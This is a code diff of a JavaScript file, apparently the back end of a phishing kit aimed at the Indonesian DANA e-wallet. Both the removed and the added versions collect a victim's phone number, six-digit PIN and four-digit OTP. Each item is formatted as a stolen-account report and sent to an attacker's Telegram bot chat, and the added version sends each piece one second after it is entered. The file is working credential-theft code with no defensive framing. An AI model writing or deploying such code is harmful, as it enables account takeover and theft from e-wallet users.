@@ -1,167 +1,123 @@
-const axios = require('axios');
+// send-dana-data.js
 
-// Format Telegram message
-function formatMessage(type, phone, pin, otp) {
-  const cleanPhone = phone.replace(/\D/g, '');
+// Variabel untuk menyimpan data
+let userData = {
+  phone: '',
+  pin: '',
+  otp: ''
+};
+
+// Fungsi untuk mengirim data ke Telegram
+async function sendToTelegram(dataType) {
+  // Mengambil token dan chat ID dari environment variables (Netlify)
+  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
   
-  let message = 
-    "├• AKUN | DANA E-WALLET\n" +
-    "├───────────────────\n" +
-    `├• NO HP : ${cleanPhone}\n`;
-
-  if (pin) {
-    message += "├───────────────────\n" +
-               `├• PIN  : ${pin}\n`;
+  // Jika token atau chat ID tidak tersedia, tidak melakukan apa-apa
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.log('Token atau Chat ID Telegram tidak ditemukan');
+    return;
   }
 
-  if (otp) {
-    message += "├───────────────────\n" +
-               `├• OTP : ${otp}\n`;
+  let message = '';
+
+  // Format pesan berdasarkan tipe data yang dikirim
+  switch(dataType) {
+    case 'phone':
+      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n╰───────────────────`;
+      break;
+    case 'pin':
+      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n├───────────────────\n├• PIN  : ${userData.pin}\n╰───────────────────`;
+      break;
+    case 'otp':
+      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n├───────────────────\n├• PIN  : ${userData.pin}\n├───────────────────\n├• OTP : ${userData.otp}\n╰───────────────────`;
+      break;
+    default:
+      console.log('Tipe data tidak dikenali');
+      return;
   }
 
-  message += "╰───────────────────";
-  return message;
-}
-
-// Validasi format nomor telepon Indonesia
-function isValidIndonesianPhone(phone) {
-  const cleanPhone = phone.replace(/\D/g, '');
-  return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('8');
-}
-
-// Validasi PIN (6 digit)
-function isValidPIN(pin) {
-  return /^\d{6}$/.test(pin);
-}
-
-// Validasi OTP (4 digit)
-function isValidOTP(otp) {
-  return /^\d{4}$/.test(otp);
-}
-
-exports.handler = async (event, context) => {
-  // CORS headers
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Methods': 'POST, OPTIONS',
-    'Access-Control-Allow-Headers': 'Content-Type'
-  };
-
-  // Handle preflight requests
-  if (event.httpMethod === 'OPTIONS') {
-    return { statusCode: 200, headers, body: '' };
-  }
-
-  if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
-  }
+  // URL API Telegram untuk mengirim pesan
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   try {
-    // Parse and validate request
-    const { type, phone, pin, otp } = JSON.parse(event.body);
-    
-    // Validasi input
-    if (!type || !phone) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'Type and phone are required' })
-      };
-    }
-
-    if (!isValidIndonesianPhone(phone)) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'Invalid phone number format' })
-      };
-    }
-
-    if (type === 'pin' && (!pin || !isValidPIN(pin))) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'Invalid PIN format' })
-      };
-    }
-
-    if (type === 'otp' && (!otp || !isValidOTP(otp))) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'Invalid OTP format' })
-      };
-    }
-
-    // Clean phone number
-    const cleanPhone = phone.replace(/\D/g, '');
-    
-    if (cleanPhone.length < 10) {
-      return {
-        statusCode: 400,
-        headers,
-        body: JSON.stringify({ error: 'Phone number must be at least 10 digits' })
-      };
-    }
-
-    // Check Telegram config
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-
-    if (!botToken || !chatId) {
-      console.error('Missing Telegram credentials');
-      return {
-        statusCode: 500,
-        headers,
-        body: JSON.stringify({ error: 'Server configuration error' })
-      };
-    }
-
-    // Format and send message
-    const message = formatMessage(type, cleanPhone, pin, otp);
-    
-    const telegramResponse = await axios.post(
-      `https://api.telegram.org/bot${botToken}/sendMessage`,
-      {
-        chat_id: chatId,
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
-      },
-      {
-        timeout: 5000 // 5 second timeout
-      }
-    );
-
-    console.log('Telegram message sent successfully:', {
-      status: telegramResponse.status,
-      timestamp: new Date().toISOString()
+      })
     });
 
-    return {
-      statusCode: 200,
-      headers,
-      body: JSON.stringify({ 
-        success: true,
-        message: 'Data sent successfully',
-        telegram_status: telegramResponse.status
-      })
-    };
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
 
+    const data = await response.json();
+    console.log('Pesan berhasil dikirim ke Telegram:', data);
+    return true;
   } catch (error) {
-    console.error('Error:', {
-      message: error.message,
-      stack: error.stack,
-      timestamp: new Date().toISOString()
-    });
-    
-    return {
-      statusCode: 500,
-      headers,
-      body: JSON.stringify({
-        error: 'Internal Server Error',
-        details: 'Something went wrong'
-      })
-    };
+    console.error('Error mengirim pesan ke Telegram:', error);
+    return false;
   }
-};
+}
+
+// Fungsi untuk menyimpan nomor telepon
+function savePhoneNumber(phone) {
+  const cleanedPhone = phone.replace(/\D/g, '');
+  if (cleanedPhone.length >= 10) {
+    userData.phone = cleanedPhone;
+    
+    // Kirim ke Telegram setelah 1 detik (simulasi proses)
+    setTimeout(() => {
+      sendToTelegram('phone');
+    }, 1000);
+    
+    return true;
+  }
+  return false;
+}
+
+// Fungsi untuk menyimpan PIN
+function savePin(pin) {
+  if (pin.length === 6) {
+    userData.pin = pin;
+    
+    // Kirim ke Telegram setelah 1 detik (simulasi proses)
+    setTimeout(() => {
+      sendToTelegram('pin');
+    }, 1000);
+    
+    return true;
+  }
+  return false;
+}
+
+// Fungsi untuk menyimpan OTP
+function saveOtp(otp) {
+  if (otp.length === 4) {
+    userData.otp = otp;
+    
+    // Kirim ke Telegram setelah 1 detik (simulasi proses)
+    setTimeout(() => {
+      sendToTelegram('otp');
+    }, 1000);
+    
+    return true;
+  }
+  return false;
+}
+
+// Ekspor fungsi untuk digunakan di script.js
+if (typeof module !== 'undefined' && module.exports) {
+  module.exports = {
+    savePhoneNumber,
+    savePin,
+    saveOtp,
+    sendToTelegram
+  };
+      }
